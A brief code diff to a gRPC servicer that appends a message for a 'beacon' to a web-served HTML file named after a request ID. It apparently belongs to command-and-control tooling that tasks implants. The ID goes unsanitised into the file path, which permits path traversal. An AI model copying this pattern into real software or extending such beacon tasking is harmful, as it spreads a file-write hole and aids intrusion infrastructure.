@@ -15,7 +15,7 @@ class RunFlask(pb2_grpc.UnaryServicer):
 
         # We need an ID (ID for beacon) and message (What to tell the beacon)
         message = request.message
-        ID = request.ID
+        ID = request.bID
         f = open(f"/var/www/html/{ID}.html", "a")
         f.write(message)
         f.close()
